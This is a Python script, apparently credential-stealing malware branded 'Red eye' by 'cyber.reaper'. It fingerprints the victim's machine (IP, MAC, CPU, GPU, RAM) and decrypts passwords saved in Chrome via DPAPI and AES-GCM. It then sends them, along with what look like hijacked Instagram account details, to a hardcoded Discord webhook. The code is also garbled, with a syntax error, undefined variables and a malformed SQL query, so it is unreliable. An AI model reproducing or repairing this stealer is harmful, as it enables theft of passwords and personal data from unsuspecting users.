import requests 
import json,base64,sqlite3,datetime,win32crypt,shutil
from Crypto.Cipher import AES
import json
import os
import platform
import random
import re
import sqlite3
import subprocess
import threading
import uuid
import wmi
from discord_webhook import DiscordWebhook, DiscordEmbed
by='''
[👁] cyber.reaper
'''

ip = requests.get('https://api.ipify.org').text
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer_os = platform.platform()
cpu = wmi.WMI().Win32_Processor()[0]
ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
gpu = wmi.WMI().Win32_VideoController()[0]
value=f''' **PC Username:** `{username}`\n **PC Name:** `{hostname}`\n **OS:** `{computer_os}`\n\n **IP:** `{ip}`\n **MAC:** `{mac}`\n **HWID:** `{hwid}`\n\n **CPU:** `{cpu.Name}`\n **GPU:** `{gpu.Name}`\n **RAM:** `{ram}GB`''',inline=False)
Webhook = "https://discord.com/api/webhooks/874210942693548102/RSA0kBsLlQbO0XEM_CdTSbDsBEH2xfCByGkPfZsNWl7PZ727YA2jOckBGRzEkGU1zWan"
data = {}
data["embeds"] = [
            {
                #"title" : f"Details...",
                "description" : f"**``fucked``** **[@{self.username}](https://instagram.com/{self.user})**\n***`password : {self.password}**\n*** email:{self.email}**\n***phone:{self.phone}**\n**{value}| claimed By Reaper`***",
                #"color": 2895667,
                "thumbnail" : {
                    "url": "https://i.pinimg.com/originals/70/56/56/705656e8c01d3668bc496bef826a21f6.gif"},
        
                "footer" : {
                "text": f'\t\t By  Reaper',
                #"icon_url": "https://cdn.discordapp.com/attachments/873022739349381173/873507948700262430/ezgif.com-gif-maker.gif"
                    
                },
                "author" :{
                    "name" : "Red eye  V0.1 Swap"
                }
                
            }
        ]
requests.post(Webhook, json=data)
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def report_to_webhook():
        username = os.getlogin()
        time = datetime.now().strftime('%d/%m/%Y %H:%M')
        webhook = DiscordWebhook(url=Webhook)
        path = os.environ["temp"] + "\\data.txt"
        with open(path, 'rb') as f:
            webhook.add_file(file=f.read(), filename='data.txt')
            embed = DiscordEmbed(title=f"Chrome Report From: ({username}) Time: {time}")
            webhook.add_embed(embed)    
            webhook.execute()
        try:
            os.remove(path) 
        except:
            pass

def main():
    os.system('cls')
    path = os.environ["temp"] + "\\data.txt" 
    f = open(path, 'a+') 
    key = get_encryption_key() 
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")  
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename) 
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, username_value, password_value")
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[2]
        password = decrypt_password(row[3], key)                
        f.write("--------------------------------------------------\n \nWebsite: %s \nUsername: %s \nPassword: %s \nAction URL: %s \n \n" % (origin_url, username, password))
        cursor.close()
        db.close()
        f.close()
        report_to_webhook()

if __name__ == "__main__":
	main()
